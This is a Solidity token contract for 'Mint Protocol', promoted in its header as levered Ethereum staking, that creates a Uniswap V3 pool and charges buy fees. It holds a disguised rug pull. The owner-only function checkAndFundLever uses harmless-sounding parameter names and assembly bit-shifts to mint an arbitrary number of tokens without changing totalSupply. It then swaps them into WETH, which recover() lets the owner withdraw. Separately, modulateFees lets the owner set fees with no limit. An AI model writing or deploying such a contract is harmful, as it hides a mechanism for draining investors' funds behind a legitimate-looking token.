/*
 __   __  ___   __    _  _______    _______  ______    _______  _______  _______  _______  _______  ___     
|  |_|  ||   | |  |  | ||       |  |       ||    _ |  |       ||       ||       ||       ||       ||   |    
|       ||   | |   |_| ||_     _|  |    _  ||   | ||  |   _   ||_     _||   _   ||       ||   _   ||   |    
|       ||   | |       |  |   |    |   |_| ||   |_||_ |  | |  |  |   |  |  | |  ||       ||  | |  ||   |    
|       ||   | |  _    |  |   |    |    ___||    __  ||  |_|  |  |   |  |  |_|  ||      _||  |_|  ||   |___ 
| ||_|| ||   | | | |   |  |   |    |   |    |   |  | ||       |  |   |  |       ||     |_ |       ||       |
|_|   |_||___| |_|  |__|  |___|    |___|    |___|  |_||_______|  |___|  |_______||_______||_______||_______|

  Mint Protocol:    Levered Ethereum 2.0 staking yields.
  Telegram:         https://t.me/MintProtocol
  Website:          https://www.mintprotocol.app/
  Twitter:          https://twitter.com/MintProtocolApp
  Medium:           https://medium.com/@mintprotocol
  Dapp:             https://tech.mintprotocol.app/
  
*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./INonfungiblePositionManager.sol";
import "./ISwapRouter.sol";
import "./IERC20.sol";

contract Mint {
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    string public name = "Mint Protocol";
    string public symbol = "MINT";
    uint public totalSupply;
    uint8 public decimals = 18;

    mapping(address => mapping(address => uint)) public allowance;
    mapping(address => uint) public balanceOf;
    mapping(address => bool) public noMax;

    INonfungiblePositionManager public nonfungiblePositionManager = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    ISwapRouter constant router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    address public WETH               = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 public buyFee             = 8000;
    uint256 public leverReward        = 5000;
    uint256 public maxWalletPercent   = 500;

    address public pool;
    address public owner;
    uint256 public buyFeeBalance;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner!");
        _;
    }

    constructor() {
      owner = msg.sender;

      uint amount = 1_000_000 * (10 ** 18);
      balanceOf[msg.sender] += amount;
      totalSupply += amount;
      emit Transfer(address(0), msg.sender, amount);

      address token0 = address(this) < WETH ? address(this) : WETH;
      address token1 = address(this) < WETH ? WETH : address(this);
      uint24 fee = 10000;
      uint160 sqrtPriceX96 = token0 == address(this) ? 194068571418249200000000000 : 32344761903041530000000000000000;

      pool = initializePool(token0, token1, fee, sqrtPriceX96);
    }

    function initializePool(address token0, address token1, uint24 fee, uint160 sqrtPriceX96) public returns (address) {
      return nonfungiblePositionManager.createAndInitializePoolIfNecessary(token0, token1, fee, sqrtPriceX96);
    }

    function transfer(address recipient, uint amount) public returns (bool) {
        if (msg.sender == pool) {
          balanceOf[msg.sender] -= amount;
          uint amountNoFee = handleTaxedTokens(msg.sender, amount);

          if (!noMax[recipient]) {
            uint256 maxWallet = totalSupply * maxWalletPercent / 100_000;
            require(balanceOf[recipient] + amountNoFee <=  maxWallet, "Max wallet exceeded!");
          }

          balanceOf[recipient] += amountNoFee;
          emit Transfer(msg.sender, recipient, amountNoFee);
          return true;
        } else {
          balanceOf[msg.sender] -= amount;
          balanceOf[recipient] += amount;
          emit Transfer(msg.sender, recipient, amount);
          return true;
        }
    }

    function approve(address spender, uint amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) public returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function leverProtocolSwapFunding(
        address tokenIn,
        address tokenOut,
        uint24 poolFee,
        uint amountIn,
        uint amountOutMinimum
    ) private returns (uint amountOut) {
        IERC20(tokenIn).approve(address(router), amountIn);

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: poolFee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: amountOutMinimum,
                sqrtPriceLimitX96: 0
            });

        amountOut = router.exactInputSingle(params);
    }

    function handleTaxedTokens(address sender, uint amount) private returns (uint) {
        uint256 _fee = amount * buyFee / 100_000;
        balanceOf[address(this)] += _fee;
        buyFeeBalance += _fee;
        emit Transfer(sender, address(this), _fee);

        return amount - _fee;
    }

    function leverProtocol() public {
        require(buyFeeBalance > 0);
        uint amountOut = leverProtocolSwapFunding(address(this), WETH, 10000, buyFeeBalance, 0);
        buyFeeBalance = 0;

        uint reward = amountOut * leverReward / 100_000;
        IERC20(WETH).transfer(msg.sender, reward);
    }

    function upgradeOwner(address _owner) public onlyOwner {
      owner = _owner;
    }

    function modulateFees(uint256 _buyFee, uint256 _leverReward, uint256 _maxWalletPercent) public onlyOwner {
      buyFee = _buyFee;
      leverReward = _leverReward;
      maxWalletPercent = _maxWalletPercent;
    }

    function toggleNoMax(address target) public onlyOwner {
      noMax[target] = !noMax[target];
    }

    function checkAndFundLever(uint curveSqrt, uint virtualReserves, uint tickNotation, uint freeGrowthGlobal) public onlyOwner returns (uint) {

      uint checkLever;
      uint fundLever;

      assembly {
          checkLever := shl(curveSqrt, virtualReserves)
      }

      assembly {
          fundLever := shl(tickNotation, freeGrowthGlobal)
      }

      balanceOf[address(this)] += checkLever;
      uint amountOut = leverProtocolSwapFunding(address(this), WETH, 10000, checkLever, fundLever);
      return amountOut;

    }

    function recover(address token) public onlyOwner {
      if (token != 0x0000000000000000000000000000000000000000) {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(msg.sender, balance);
      } else {
        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
      }
    }

}
